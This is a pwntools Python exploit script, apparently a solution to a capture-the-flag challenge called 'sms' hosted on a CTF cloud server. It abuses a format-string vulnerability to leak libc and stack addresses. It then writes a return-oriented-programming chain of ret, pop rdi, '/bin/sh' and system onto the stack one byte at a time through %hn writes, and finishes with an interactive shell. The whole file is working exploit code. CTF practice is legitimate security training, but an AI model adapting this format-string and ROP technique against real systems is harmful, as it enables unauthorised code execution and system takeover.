#!/usr/bin/python3

from pwn import *

exe = ELF('sms_patched', checksec=False)
libc = ELF("libc.so.6")
context.binary = exe
def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x0000000000001333

        c
        ''')
        input()


if args.REMOTE:
    p = remote('sms.squ1rrel-ctf-codelab.kctf.cloud', 1337)
else:
    p = process(exe.path)
GDB()


def se(mes, name):
    sla(b": ", mes)
    sla(b": ", name)

def see(val):
    global stack
    pa = f'%{val&0xff}c%12$hn'
    se(p64(stack), pa)
    stack += 1
se(b'a', '%31$p|%33$p|')
p.recvuntil(b'farewells,\n')
libc.address = int(p.recvuntil(b'|', drop=True), 16) - 0x24083
stack = int(p.recvline(keepends=False), 16) - 0xf0
info("libc.address " + hex(libc.address))
sla(b'(y/n)', b'y')
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = pop_rdi+1
info("pop rdi " + hex(pop_rdi))
info("stack" + hex(stack))

for i in range(6):
    see(ret&0xff)
    ret = ret >> 8
    sla(b'(y/n)', b'y')    
stack +=2

for i in range(6):
    see(pop_rdi&0xff)
    pop_rdi = pop_rdi >> 8
    sla(b'(y/n)', b'y')

stack +=2
binsh = next(libc.search(b'/bin/sh'))
for i in range(6):
    see(binsh&0xff)
    binsh = binsh >> 8
    sla(b'(y/n)', b'y')

stack +=2
system = libc.sym.system
for i in range(6):
    see(system&0xff)
    system = system >> 8
    sla(b'(y/n)', b'y')
se(b'wan', b'wan')
sla(b'(y/n)', b'n')

p.interactive()
